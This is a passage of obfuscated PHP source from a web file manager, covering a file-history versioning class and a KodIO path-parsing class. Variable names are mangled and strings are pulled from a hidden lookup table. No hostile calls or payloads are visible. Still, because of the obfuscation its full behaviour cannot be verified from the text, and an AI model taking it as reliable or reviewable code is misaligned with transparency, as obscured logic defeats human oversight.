($Øˆ¬ƒİ›[$«Ãœû¢[1218]] <= 0) { return; } if (isset($_REQUEST[$«Ãœû¢[1219]]) && $_REQUEST[$«Ãœû¢[1219]] == $«Ãœû¢[88]) { return; } Hook::bind($«Ãœû¢[1220], $«Ãœû¢[1221]); Hook::bind($«Ãœû¢[1222], $«Ãœû¢[1223]); Hook::bind($«Ãœû¢[1224], $«Ãœû¢[1225]); Hook::bind($«Ãœû¢[1226], $«Ãœû¢[1227]); Hook::bind($«Ãœû¢[1228], $«Ãœû¢[1229]); Hook::bind($«Ãœû¢[1230], $«Ãœû¢[1231]); } public static function eventBeforeUpload($Å‡Ã„¾·) { if ($Å‡Ã„¾·[3] && $Å‡Ã„¾·[3] != REPEAT_REPLACE) { return; } $ÁŒÇğ·Ë = self::parsePath($Å‡Ã„¾·[0]); if (!$ÁŒÇğ·Ë) { return; } self::add($ÁŒÇğ·Ë); } public static function eventBeforeEdit($¦…Ğˆ‚ø) { $¬ú±İ¢ = self::parsePath($¦…Ğˆ‚ø[0]); if (!$¬ú±İ¢) { return; } self::add($¬ú±İ¢); } public static function eventBeforeCopyFile($·Ë¸õÖÊ, $“¹¢„Û, $æ“½å¿’, $Â¹Åæı, $ßäê«‘Š, $®á¡ßæË) { $ÜšĞÊÔš =& $_SERVER[ĞÂ¤àÓï]; if (isset($æ“½å¿’->_data[$ÜšĞÊÔš[1155]]) && $æ“½å¿’->_data[$ÜšĞÊÔš[1155]]) { return; } $ëÊüõ½ = $æ“½å¿’->getPathOuter($Â¹Åæı); $Ä³»Øüñ = self::parsePath($ëÊüõ½); if (!$Ä³»Øüñ) { return; } self::add($Ä³»Øüñ); } public static function eventBeforeRename($•ÛÇùùÙ) { $ë°²¿° =& $_SERVER[ĞÂ¤àÓï]; $ùŸàëÁğ = self::parsePath($•ÛÇùùÙ[0]); if (!$ùŸàëÁğ) { return; } $à—ÆçƒÄ = self::checkInHistory($ùŸàëÁğ); if (!$à—ÆçƒÄ) { return; } if ($à—ÆçƒÄ[$ë°²¿°[33]] == $ë°²¿°[199]) { $®ØÉû–¡ = self::listData($ùŸàëÁğ); if ($®ØÉû–¡ && $®ØÉû–¡[$ë°²¿°[369]]) { self::moveHistory($ùŸàëÁğ, $•ÛÇùùÙ[1]); } } else { IO::rename($à—ÆçƒÄ[$ë°²¿°[84]], $•ÛÇùùÙ[1]); } } public static function eventBeforeMove($éäÕâ¼š) { $šóÅªÒ =& $_SERVER[ĞÂ¤àÓï]; $ÈË§åÚÚ = self::parsePath($éäÕâ¼š[0]); if (!$ÈË§åÚÚ) { return; } $Ñ‹Õ¡„Ù = self::parsePath($éäÕâ¼š[1]); if (!$Ñ‹Õ¡„Ù) { return; } $ä÷±Şô• = $éäÕâ¼š[3]; $øƒ°‘Ù = self::checkInHistory($ÈË§åÚÚ); if (!$øƒ°‘Ù) { return; } $“¨ü½ÕÀ = self::pathHistory($Ñ‹Õ¡„Ù); if ($øƒ°‘Ù[$šóÅªÒ[33]] == $šóÅªÒ[199]) { $«˜óì©¸ = self::listData($ÈË§åÚÚ); $¼İ¡Õ¤Ñ = rtrim($Ñ‹Õ¡„Ù, $šóÅªÒ[8]) . $šóÅªÒ[8] . ($ä÷±Şô• ? $ä÷±Şô• : get_path_this($ÈË§åÚÚ)); $ãôí—å™ = self::listData($¼İ¡Õ¤Ñ); if ($«˜óì©¸ && $«˜óì©¸[$šóÅªÒ[369]] && $ãôí—å™ && $ãôí—å™[$šóÅªÒ[369]]) { return self::clear($ÈË§åÚÚ); } if ($«˜óì©¸ && $«˜óì©¸[$šóÅªÒ[369]]) { self::moveHistory($ÈË§åÚÚ, $ä÷±Şô•, $“¨ü½ÕÀ); } } else { IO::move($øƒ°‘Ù[$šóÅªÒ[84]], $“¨ü½ÕÀ, !1, $ä÷±Şô•); self::clearEmptyFolder(IO::pathFather($øƒ°‘Ù[$šóÅªÒ[84]])); } } public static function eventAfterRemove($Û¡Û†Äê, $ºŞÑ‘›ç) { $ªì¾©ª =& $_SERVER[ĞÂ¤àÓï]; if (!$ºŞÑ‘›ç) { return; } $ùÎ©•öÙ = self::parsePath($Û¡Û†Äê[0]); if (!$ùÎ©•öÙ) { return; } $ÀŸ¹ĞÓË = self::checkInHistory($ùÎ©•öÙ); if (!$ÀŸ¹ĞÓË) { return; } if ($ÀŸ¹ĞÓË[$ªì¾©ª[33]] == $ªì¾©ª[199]) { $ôïÈñıö = self::listData($ùÎ©•öÙ, !1); if ($ôïÈñıö && $ôïÈñıö[$ªì¾©ª[369]]) { self::clear($ùÎ©•öÙ, !1); } } else { IO::remove($ÀŸ¹ĞÓË[$ªì¾©ª[84]]); self::clearEmptyFolder(IO::pathFather($ÀŸ¹ĞÓË[$ªì¾©ª[84]])); } } private static function checkInHistory($Îœâƒ¤ı) { $¹Ô£ƒğÉ = self::pathHistory($Îœâƒ¤ı); if (!IO::exist($¹Ô£ƒğÉ)) { $¹Ô£ƒğÉ .= $_SERVER[ĞÂ¤àÓï][1232]; } return IO::exist($¹Ô£ƒğÉ) ? IO::info($¹Ô£ƒğÉ) : !1; } private static function parsePath($Ë‰³²€î) { $ìƒÎ£› =& $_SERVER[ĞÂ¤àÓï]; if (!$Ë‰³²€î) { return !1; } if ($GLOBALS[$ìƒÎ£›[1233]]) { return; } $ÚÂ¢Á‘î = KodIO::parse($Ë‰³²€î); $ª›º¦‘ = $ÚÂ¢Á‘î[$ìƒÎ£›[33]]; $Ö€¡áÔ = !$ª›º¦‘ || $ª›º¦‘ == KodIO::KOD_IO || $ª›º¦‘ == KodIO::KOD_SHARE_ITEM; if (!$Ö€¡áÔ || !$ÚÂ¢Á‘î[$ìƒÎ£›[1234]]) { return !1; } if (substr($Ë‰³²€î, 0, strlen(DATA_PATH . $ìƒÎ£›[1235])) == DATA_PATH . $ìƒÎ£›[1235]) { return !1; } if ($ª›º¦‘ == KodIO::KOD_SHARE_ITEM) { $“‰†¢Ë­ = IO::init($Ë‰³²€î); if ($“‰†¢Ë­->pathParse[$ìƒÎ£›[1151]]) { return self::parsePath($“‰†¢Ë­->pathParse[$ìƒÎ£›[1151]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Íş€ãÎÃ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ìƒÎ£›[1236]); foreach ($Íş€ãÎÃ as $˜İàõÙ) { if (!$ª›º¦‘ && substr($Ë‰³²€î, 0, strlen($˜İàõÙ)) == $˜İàõÙ) { return !1; } } self::log($GLOBALS[$ìƒÎ£›[1146]] . $ìƒÎ£›[1237] . $Ë‰³²€î); return $Ë‰³²€î; } private static function pathHistory($š†½½À“) { $Á×±Ş²Ì =& $_SERVER[ĞÂ¤àÓï]; $öñï‰‚ë = self::$_historyBase . ltrim(KodIO::clear($š†½½À“), $Á×±Ş²Ì[8]); $öñï‰‚ë = str_replace(array($Á×±Ş²Ì[1238]), array($Á×±Ş²Ì[1239]), $öñï‰‚ë); return $öñï‰‚ë; } public static function log($Ëš¥¨•Ş) { } public static function historyCount($ÑÂŸã«‘) { $Ô¶¼´ıÒ =& $_SERVER[ĞÂ¤àÓï]; $êŒ¤¥¸‘ = array(); $ŞãªÄ’± = array(); foreach ($ÑÂŸã«‘ as $ıîÜ³¿¼) { $˜•İäì‰ = get_path_father($ıîÜ³¿¼); if (!$ŞãªÄ’±[$˜•İäì‰]) { $ŞãªÄ’±[$˜•İäì‰] = array(); } $ŞãªÄ’±[$˜•İäì‰][] = get_path_this($ıîÜ³¿¼); } foreach ($ŞãªÄ’± as $˜•İäì‰ => $’ÖÄî±ˆ) { $çÌàÉª = self::parsePath($˜•İäì‰); if (!$çÌàÉª) { continue; } foreach ($’ÖÄî±ˆ as $š«™ÖøŠ) { $¼–÷â–š = self::listData(rtrim($çÌàÉª, $Ô¶¼´ıÒ[8]) . $Ô¶¼´ıÒ[8] . $š«™ÖøŠ, !1); if ($¼–÷â–š && $¼–÷â–š[$Ô¶¼´ıÒ[369]]) { $êŒ¤¥¸‘[rtrim($˜•İäì‰, $Ô¶¼´ıÒ[8]) . $Ô¶¼´ıÒ[8] . $š«™ÖøŠ] = count($¼–÷â–š[$Ô¶¼´ıÒ[369]]); } } } return $êŒ¤¥¸‘; } public static function add($³˜Î·©Á) { $Äñ¶Èô´ =& $_SERVER[ĞÂ¤àÓï]; $®•êëÛ = self::listData($³˜Î·©Á); if (!$®•êëÛ) { return; } $à±Ù¤ğ— = Model($Äñ¶Èô´[769])->get($Äñ¶Èô´[1240]); $Ãäßïñ£ = $GLOBALS[$Äñ¶Èô´[6]][$Äñ¶Èô´[89]][$Äñ¶Èô´[1218]]; $×ßÙ„Ã¸ = $à±Ù¤ğ— == $Äñ¶Èô´[1241] ? min(5, $Ãäßïñ£) : $Ãäßïñ£; if ($Ãäßïñ£ <= 0) { return; } $Î¯çıß² = IO::info($³˜Î·©Á); $ï…¢”¢´ = $®•êëÛ[$Äñ¶Èô´[369]]; if ($Î¯çıß²[$Äñ¶Èô´[76]] == 0) { return; } if ($Î¯çıß²[$Äñ¶Èô´[76]] >= 1024 * 1024 * 500) { return !1; } $Ó§áı­Š = IO::hashSimple($³˜Î·©Á); if ($ï…¢”¢´ && $ï…¢”¢´[0][$Äñ¶Èô´[177]] == $Ó§áı­Š) { return !0; } if (array_key_exists($Äñ¶Èô´[202], $Î¯çıß²) && !$Î¯çıß²[$Äñ¶Èô´[202]]) { return !1; } $ëƒ“„è = short_id(time()); $÷—â˜Š¡ = array($Äñ¶Èô´[399] => $ëƒ“„è, $Äñ¶Èô´[177] => $Ó§áı­Š, $Äñ¶Èô´[32] => $Î¯çıß²[$Äñ¶Èô´[32]] . $Äñ¶Èô´[10] . date($Äñ¶Èô´[1242]) . rand_string(1), $Äñ¶Èô´[76] => $Î¯çıß²[$Äñ¶Èô´[76]], $Äñ¶Èô´[454] => USER_ID, $Äñ¶Èô´[200] => time(), $Äñ¶Èô´[1243] => $Äñ¶Èô´[12]); IO::mkdir($®•êëÛ[$Äñ¶Èô´[1244]]); $–„öœñ = IO::copy($³˜Î·©Á, $®•êëÛ[$Äñ¶Èô´[1244]], !1, $÷—â˜Š¡[$Äñ¶Èô´[32]]); if (!$–„öœñ) { self::clearEmptyFolder($®•êëÛ[$Äñ¶Èô´[1244]]); return !1; } array_unshift($ï…¢”¢´, $÷—â˜Š¡); if (count($ï…¢”¢´) > $×ßÙ„Ã¸) { $û“ë¸óş = array_slice($ï…¢”¢´, $×ßÙ„Ã¸); foreach ($û“ë¸óş as $ßÃ€ßïË) { IO::remove($®•êëÛ[$Äñ¶Èô´[1244]] . $ßÃ€ßïË[$Äñ¶Èô´[32]]); } $ï…¢”¢´ = array_slice($ï…¢”¢´, 0, $×ßÙ„Ã¸); } return self::saveData($®•êëÛ[$Äñ¶Èô´[1245]], $ï…¢”¢´); } public static function remove($Éó¼¨Ïæ, $àèÇÇŠ¬) { $¼ª‰¬±† =& $_SERVER[ĞÂ¤àÓï]; $¢ˆûÊ÷Š = self::listData($Éó¼¨Ïæ); $ˆˆÎß¶ = array(); if (!$¢ˆûÊ÷Š) { return !1; } foreach ($¢ˆûÊ÷Š[$¼ª‰¬±†[369]] as $Ô·ÙËî·) { if ($Ô·ÙËî·[$¼ª‰¬±†[399]] == $àèÇÇŠ¬) { IO::remove($¢ˆûÊ÷Š[$¼ª‰¬±†[1244]] . $Ô·ÙËî·[$¼ª‰¬±†[32]]); continue; } $ˆˆÎß¶[] = $Ô·ÙËî·; } return self::saveData($¢ˆûÊ÷Š[$¼ª‰¬±†[1245]], $ˆˆÎß¶); } public static function clear($ïÏ€ì´’, $É‡‚‹’ = true) { $¹òøÒ‘¼ =& $_SERVER[ĞÂ¤àÓï]; $ìµÇ¿´¢ = self::listData($ïÏ€ì´’, $É‡‚‹’); if (!$ìµÇ¿´¢) { return !1; } foreach ($ìµÇ¿´¢[$¹òøÒ‘¼[369]] as $úÊôó¶) { IO::remove($ìµÇ¿´¢[$¹òøÒ‘¼[1244]] . $úÊôó¶[$¹òøÒ‘¼[32]]); } return self::saveData($ìµÇ¿´¢[$¹òøÒ‘¼[1245]], array()); } public static function moveHistory($ğ˜ŸÙ‘º, $Š„–¥½Ï = '', $ëóıÌ—ö = '') { $¿´¨İñ =& $_SERVER[ĞÂ¤àÓï]; $‰”Ğíİ = self::listData($ğ˜ŸÙ‘º, !1); if (!$‰”Ğíİ || !$‰”Ğíİ[$¿´¨İñ[369]]) { return !1; } $ê¬ÎÔ = $¿´¨İñ[1232]; $Š„–¥½Ï = $Š„–¥½Ï ? $Š„–¥½Ï : get_path_this($ğ˜ŸÙ‘º); $ëóıÌ—ö = $ëóıÌ—ö ? $ëóıÌ—ö : $‰”Ğíİ[$¿´¨İñ[1244]]; $ÜÂ‰œÛ = substr(get_path_this($‰”Ğíİ[$¿´¨İñ[1245]]), 0, -strlen($ê¬ÎÔ)); foreach ($‰”Ğíİ[$¿´¨İñ[369]] as $ˆüÜ”Ù‘ => $°—ÚÕù) { $áª¶’š¼ = $Š„–¥½Ï . substr($°—ÚÕù[$¿´¨İñ[32]], strlen($ÜÂ‰œÛ)); $ğû˜ÈÄ‹ = IO::move($‰”Ğíİ[$¿´¨İñ[1244]] . $°—ÚÕù[$¿´¨İñ[32]], $ëóıÌ—ö, !1, $áª¶’š¼); if ($ğû˜ÈÄ‹) { $‰”Ğíİ[$¿´¨İñ[369]][$ˆüÜ”Ù‘][$¿´¨İñ[32]] = $áª¶’š¼; } } $‰”Ğíİ[$¿´¨İñ[1245]] = IO::move($‰”Ğíİ[$¿´¨İñ[1245]], $ëóıÌ—ö, !1, $Š„–¥½Ï . $ê¬ÎÔ); self::saveData($‰”Ğíİ[$¿´¨İñ[1245]], $‰”Ğíİ[$¿´¨İñ[369]]); self::clearEmptyFolder($‰”Ğíİ[$¿´¨İñ[1244]]); } public static function rollback($¿ÖÊâ­à, $Ç¿¶¿êà) { $ºô÷õŒÖ =& $_SERVER[ĞÂ¤àÓï]; $ğüÃºı® = self::listData($¿ÖÊâ­à); if (!$ğüÃºı®) { return; } $™Éäôœ = IO::info($¿ÖÊâ­à); foreach ($ğüÃºı®[$ºô÷õŒÖ[369]] as $“Ô¨ä£° => $–×ò©Õ‡) { if ($–×ò©Õ‡[$ºô÷õŒÖ[399]] == $Ç¿¶¿êà) { self::add($¿ÖÊâ­à); $üœ“ı² = $ğüÃºı®[$ºô÷õŒÖ[1244]] . $–×ò©Õ‡[$ºô÷õŒÖ[32]]; $Í¬•¢‡È = IO::copy($üœ“ı², IO::pathFather($¿ÖÊâ­à), REPEAT_REPLACE, $™Éäôœ[$ºô÷õŒÖ[32]]); if ($Í¬•¢‡È) { self::remove($¿ÖÊâ­à, $Ç¿¶¿êà); } return $Í¬•¢‡È; } } return !1; } public static function setDetail($Ëğë„é, $€ô×¤©…, $‹¨äûŞ) { $³ôÚåø‚ =& $_SERVER[ĞÂ¤àÓï]; $‚¬¦÷†¨ = self::listData($Ëğë„é); if (!$‚¬¦÷†¨) { return; } foreach ($‚¬¦÷†¨[$³ôÚåø‚[369]] as $ä– Äîß => $ù¤Úìé) { if ($ù¤Úìé[$³ôÚåø‚[399]] == $€ô×¤©…) { $‚¬¦÷†¨[$³ôÚåø‚[369]][$ä– Äîß][$³ôÚåø‚[1243]] = $‹¨äûŞ; self::saveData($‚¬¦÷†¨[$³ôÚåø‚[1245]], $‚¬¦÷†¨[$³ôÚåø‚[369]]); return !0; } } return !1; } public static function fileInfo($Î ¹›¨, $ÊÒ³Ö–ó) { $ìÀ¨µ¬ =& $_SERVER[ĞÂ¤àÓï]; $ı˜Ó‘ĞŒ = self::listData($Î ¹›¨); if (!$ı˜Ó‘ĞŒ) { show_json(LNG($ìÀ¨µ¬[105]), !1); } $Å†ë‡ã = $ìÀ¨µ¬[12]; foreach ($ı˜Ó‘ĞŒ[$ìÀ¨µ¬[369]] as $—ò’ÔªÔ => $Û„¯úæ•) { if ($Û„¯úæ•[$ìÀ¨µ¬[399]] != $ÊÒ³Ö–ó) { continue; } $Å†ë‡ã = $ı˜Ó‘ĞŒ[$ìÀ¨µ¬[1244]] . $Û„¯úæ•[$ìÀ¨µ¬[32]]; break; } if (!$Å†ë‡ã) { show_json(LNG($ìÀ¨µ¬[105]), !1); } return IO::info($Å†ë‡ã); } public static function fileOut($ˆ¥°Í©, $ø³ïş±Ö, $©›”Àù = false) { $µÍôÜÊ² =& $_SERVER[ĞÂ¤àÓï]; $ÃŠ¸æüì = self::fileInfo($ˆ¥°Í©, $ø³ïş±Ö); $’½¸æ° =& $GLOBALS[$µÍôÜÊ²[7]]; $©›”Àù = isset($’½¸æ°[$µÍôÜÊ²[1195]]) && $’½¸æ°[$µÍôÜÊ²[1195]] == 1; if (isset($’½¸æ°[$µÍôÜÊ²[33]]) && $’½¸æ°[$µÍôÜÊ²[33]] == $µÍôÜÊ²[1246]) { return IO::fileOutImage($ÃŠ¸æüì[$µÍôÜÊ²[84]], $’½¸æ°[$µÍôÜÊ²[1247]]); } IO::fileOut($ÃŠ¸æüì[$µÍôÜÊ²[84]], $©›”Àù, get_path_this($ˆ¥°Í©)); } public static function listData($š—Šš·–, $¥ëõĞ¤ = true) { $æŞ´Ò±· =& $_SERVER[ĞÂ¤àÓï]; if ($¥ëõĞ¤ && !IO::exist($š—Šš·–)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($š—Šš·–, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $İ¦È¹× = self::pathHistory($š—Šš·–); $ÜÙÚÖŒ¡ = array($æŞ´Ò±·[1245] => $İ¦È¹× . $æŞ´Ò±·[1232], $æŞ´Ò±·[1244] => rtrim(get_path_father($İ¦È¹×), $æŞ´Ò±·[8]) . $æŞ´Ò±·[8], $æŞ´Ò±·[369] => array()); $×ƒó†Õ = IO::getContent($ÜÙÚÖŒ¡[$æŞ´Ò±·[1245]]); if ($×ƒó†Õ) { $¹üúÉıó = json_decode($×ƒó†Õ, !0); if (is_array($¹üúÉıó)) { $ÜÙÚÖŒ¡[$æŞ´Ò±·[369]] = $¹üúÉıó; } } return $ÜÙÚÖŒ¡; } private static function saveData($´“º¨¬Ø, $—äÑö¨) { $ˆóøÛüĞ =& $_SERVER[ĞÂ¤àÓï]; self::log($ˆóøÛüĞ[1248] . $´“º¨¬Ø . $ˆóøÛüĞ[71] . count($—äÑö¨), $ˆóøÛüĞ[751]); if ($—äÑö¨) { return IO::setContent($´“º¨¬Ø, json_encode($—äÑö¨)); } $ÑüÙ¦ = IO::pathFather($´“º¨¬Ø); IO::remove($´“º¨¬Ø); self::clearEmptyFolder($ÑüÙ¦); return !0; } public static function clearEmptyFolder($¢ºõ¸Ãƒ) { $«ßˆÔ€— =& $_SERVER[ĞÂ¤àÓï]; if (trim($¢ºõ¸Ãƒ, $«ßˆÔ€—[8]) == trim(self::$_historyBase, $«ßˆÔ€—[8])) { return; } $œ˜ÙÌğÑ = IO::pathFather($¢ºõ¸Ãƒ); $°àà“³ = IO::has($¢ºõ¸Ãƒ, !0); if ($°àà“³[$«ßˆÔ€—[207]] > 0 || $°àà“³[$«ßˆÔ€—[208]] > 0) { return; } IO::remove($¢ºõ¸Ãƒ); self::clearEmptyFolder($œ˜ÙÌğÑ); } private static function getBasePath() { $äã”˜ñ© =& $_SERVER[ĞÂ¤àÓï]; $¼ëçØ» = Model($äã”˜ñ©[1249])->get($äã”˜ñ©[1250]); if ($¼ëçØ») { if (!IO::exist($¼ëçØ»)) { IO::mkdir($¼ëçØ»); } if (get_path_this($¼ëçØ») == $äã”˜ñ©[1235]) { $¹ŒüßóŠ = $äã”˜ñ©[1251] . rand_string(8); @rename($¼ëçØ», get_path_father($¼ëçØ») . $äã”˜ñ©[8] . $¹ŒüßóŠ); $¼ëçØ» = DATA_PATH . $¹ŒüßóŠ . $äã”˜ñ©[8]; file_put_contents(DATA_PATH . $äã”˜ñ©[1185], $äã”˜ñ©[12]); Model($äã”˜ñ©[1249])->set($äã”˜ñ©[1250], $¼ëçØ»); } return $¼ëçØ»; } $¼ëçØ» = DATA_PATH . $äã”˜ñ©[1251] . rand_string(8) . $äã”˜ñ©[8]; $¼ëçØ» = IO::mkdir($¼ëçØ»); $¼ëçØ» = rtrim($¼ëçØ», $äã”˜ñ©[8]) . $äã”˜ñ©[8]; file_put_contents($¼ëçØ» . $äã”˜ñ©[1185], $äã”˜ñ©[12]); file_put_contents(DATA_PATH . $äã”˜ñ©[1185], $äã”˜ñ©[12]); Model($äã”˜ñ©[1249])->set($äã”˜ñ©[1250], $¼ëçØ»); return $¼ëçØ»; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\x72\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\x72\122\x65\143\171\143\154\145\175"; const KOD_USER_FAV = "\x7b\x75\163\145\x72\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\x65\162\106\151\154\x65\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\x72\106\151\x6c\145\x54\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\165\160\x52\x6f\x6f\x74\x53\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\x65\162\123\x68\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\162\x53\x68\141\x72\145\114\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\x72\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\162\145\111\x74\145\155\175"; const KOD_SHARE_LINK = "\173\x73\150\141\x72\x65\x49\x74\x65\155\114\151\x6e\153\x7d"; const KOD_SEARCH = "\173\x73\145\141\x72\x63\150\x7d"; const KOD_BLOCK = "\173\x62\154\x6f\x63\x6b\x7d"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\162\x52\x65\x6e\x63\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\151\166\145\x72\x7d"; public static function typeList() { $æü„®ĞÄ =& $_SERVER[ĞÂ¤àÓï]; return array($æü„®ĞÄ[1252] => self::KOD_SOURCE, $æü„®ĞÄ[1253] => self::KOD_USER_RECYCLE, $æü„®ĞÄ[1254] => self::KOD_USER_FAV, $æü„®ĞÄ[1255] => self::KOD_USER_FILE_TAG, $æü„®ĞÄ[1256] => self::KOD_USER_FILE_TYPE, $æü„®ĞÄ[1257] => self::KOD_GROUP_ROOT_SELF, $æü„®ĞÄ[1258] => self::KOD_USER_SHARE, $æü„®ĞÄ[1259] => self::KOD_USER_SHARE_LINK, $æü„®ĞÄ[1260] => self::KOD_USER_SHARE_TO_ME, $æü„®ĞÄ[1261] => self::KOD_SHARE_ITEM, $æü„®ĞÄ[1262] => self::KOD_SHARE_LINK, $æü„®ĞÄ[1263] => self::KOD_SEARCH, $æü„®ĞÄ[1264] => self::KOD_BLOCK, $æü„®ĞÄ[1265] => self::KOD_IO, $æü„®ĞÄ[1266] => self::KOD_USER_RECENT, $æü„®ĞÄ[1267] => self::KOD_USER_DRIVER); } public static function parse($ì£ˆ¡¡¹) { $ƒÊÜå ´ =& $_SERVER[ĞÂ¤àÓï]; $ì£ˆ¡¡¹ = self::clear($ì£ˆ¡¡¹); $Ã¾òûê¨ = array_values(self::typeList()); preg_match($ƒÊÜå ´[1268], $ì£ˆ¡¡¹, $ŞíÌï¬ê); $¾Óí´û• = array($ƒÊÜå ´[422] => !1, $ƒÊÜå ´[1269] => !1, $ƒÊÜå ´[419] => !1, $ƒÊÜå ´[84] => $ì£ˆ¡¡¹, $ƒÊÜå ´[1170] => !1, $ƒÊÜå ´[1169] => $ƒÊÜå ´[12]); if (is_array($ŞíÌï¬ê) && count($ŞíÌï¬ê) == 5) { $‡äëÉ¬ = $ƒÊÜå ´[1270] . $ŞíÌï¬ê[2] . $ƒÊÜå ´[327]; if (in_array($‡äëÉ¬, $Ã¾òûê¨)) { $¾Óí´û•[$ƒÊÜå ´[1170]] = $ŞíÌï¬ê[1]; $¾Óí´û•[$ƒÊÜå ´[33]] = $‡äëÉ¬; $¾Óí´û•[$ƒÊÜå ´[1271]] = substr($‡äëÉ¬, 1, -1); $¾Óí´û•[$ƒÊÜå ´[399]] = $ŞíÌï¬ê[3]; } $¾Óí´û•[$ƒÊÜå ´[1169]] = $ŞíÌï¬ê[4]; } $ÆßÊ×œï = array($ƒÊÜå ´[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $¾Óí´û•[$ƒÊÜå ´[1234]] = in_array($¾Óí´û•[$ƒÊÜå ´[33]], $ÆßÊ×œï); return $¾Óí´û•; } public static function isTruePath($æÕÓÃ‘ó) { $‘Öô“¹Ù =& $_SERVER[ĞÂ¤àÓï]; if (substr($æÕÓÃ‘ó, 0, 1) != $‘Öô“¹Ù[1270]) { return !0; } if (strpos($æÕÓÃ‘ó, $‘Öô“¹Ù[408]) === 0) { return !0; } if (strpos($æÕÓÃ‘ó, $‘Öô“¹Ù[1238]) === 0) { return !0; } if (strpos($æÕÓÃ‘ó, $‘Öô“¹Ù[1272]) === 0) { return !0; } if (strpos($æÕÓÃ‘ó, $‘Öô“¹Ù[1273]) === 0) { return !0; } if (strpos($æÕÓÃ‘ó, $‘Öô“¹Ù[1274]) === 0) { return !0; } return !1; } public static function clear($­Î×®£Ú) { $É¿¹Ø¼ò =& $_SERVER[ĞÂ¤àÓï]; $­Î×®£Ú = str_replace(array($É¿¹Ø¼ò[1078], $É¿¹Ø¼ò[231]), $É¿¹Ø¼ò[53], $­Î×®£Ú); $­Î×®£Ú = str_replace($É¿¹Ø¼ò[97], $É¿¹Ø¼ò[8], $­Î×®£Ú); $É”¾ãËş = $É¿¹Ø¼ò[1275]; if (substr($­Î×®£Ú, 0, 3) == $É¿¹Ø¼ò[1276]) { $­Î×®£Ú = substr($­Î×®£Ú, 3); } while (strstr($­Î×®£Ú, $É”¾ãËş)) { $­Î×®£Ú = str_replace($É”¾ãËş, $É¿¹Ø¼ò[8], $­Î×®£Ú); } $­Î×®£Ú = preg_replace($É¿¹Ø¼ò[1277], $É¿¹Ø¼ò[8], $­Î×®£Ú); if ($­Î×®£Ú == $É¿¹Ø¼ò[8]) { return $É¿¹Ø¼ò[8]; } $­Î×®£Ú = rtrim($­Î×®£Ú, $É¿¹Ø¼ò[8]); return $­Î×®£Ú; } public static function sourceID($àø˜éñ©) { $ÏÙìÈİú =& $_SERVER[ĞÂ¤àÓï]; $²Â‚ºÌè = self::parse($àø˜éñ©); if ($²Â‚ºÌè[$ÏÙìÈİú[33]] !== self::KOD_SOURCE) { show_json(LNG($ÏÙìÈİú[1278]), !1); } return $²Â‚ºÌè[$ÏÙìÈİú[399]]; } public static function make($İÔŠÉÍÀ) { if (!$İÔŠÉÍÀ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($İÔŠÉÍÀ)); } public static function makeShare($©Ù™”Œ¥, $ ÄŞÏù) { return self::makePath(self::KOD_SHARE_ITEM, $©Ù™”Œ¥, $ ÄŞÏù); } public static function makeFileTypePath($ÚºõË¢¥) { return self::makePath(self::KOD_USER_FILE_TYPE, $ÚºõË¢¥); } public static function makeFileTagPath($şé×†œ¯) { return self::makePath(self::KOD_USER_FILE_TAG, $şé×†œ¯); } public static function makePath($ÍÅ“«ùê, $‹ÇÒúÒ = '', $Âé·äæÁ = '') { $±”§ºæ‘ =& $_SERVER[ĞÂ¤àÓï]; $¥µ¸î» = substr($ÍÅ“«ùê, 1, -1); $²ç®öé = $±”§ºæ‘[1279] . $¥µ¸î» . $±”§ºæ‘[1280] . $‹ÇÒúÒ . $±”§ºæ‘[1281]; $²ç®öé = $Âé·äæÁ ? $²ç®öé . $Âé·äæÁ . $±”§ºæ‘[8] : $²ç®öé; return $²ç®öé; } public static function hashPath($ÔÓ‚§í, $Ê»Ëƒ„ = true) { $Şõµ¿Ä´ =& $_SERVER[ĞÂ¤àÓï]; $¥£ƒÚí¥ = is_array($ÔÓ‚§í) ? $ÔÓ‚§í : IO::info($ÔÓ‚§í); $”œ¶Óåó = _get($¥£ƒÚí¥, $Şõµ¿Ä´[1282], $Şõµ¿Ä´[12]); if (!$”œ¶Óåó && isset($¥£ƒÚí¥[$Şõµ¿Ä´[402]])) { $¥£ƒÚí¥ = IO::info(KodIO::make($¥£ƒÚí¥[$Şõµ¿Ä´[402]])); $”œ¶Óåó = _get($¥£ƒÚí¥, $Şõµ¿Ä´[1282], $Şõµ¿Ä´[12]); } if (!$”œ¶Óåó && $Ê»Ëƒ„) { $ˆÉÁ²¢¡ = KodIO::parse($¥£ƒÚí¥[$Şõµ¿Ä´[84]]); if (!$ˆÉÁ²¢¡[$Şõµ¿Ä´[33]]) { $”œ¶Óåó = IO::hashSimple($¥£ƒÚí¥[$Şõµ¿Ä´[84]]); } } if (!$”œ¶Óåó) { $”œ¶Óåó = md5($¥£ƒÚí¥[$Şõµ¿Ä´[84]] . $¥£ƒÚí¥[$Şõµ¿Ä´[76]] . $¥£ƒÚí¥[$Şõµ¿Ä´[85]]); } return $”œ¶Óåó; } public static function hashPathSafe($İúúÉó, $…Ã•ôÖ© = true) { $ÔÍ‰ñö¥ =& $_SERVER[ĞÂ¤àÓï]; $¼‚ëÌÑ‚ = self::hashPath($İúúÉó, $…Ã•ôÖ©); return md5($¼‚ëÌÑ‚ . $ÔÍ‰ñö¥[1283] . Model($ÔÍ‰ñö¥[769])->get($ÔÍ‰ñö¥[770])); } public static function initSystemPath() { $ê¢ı’´— =& 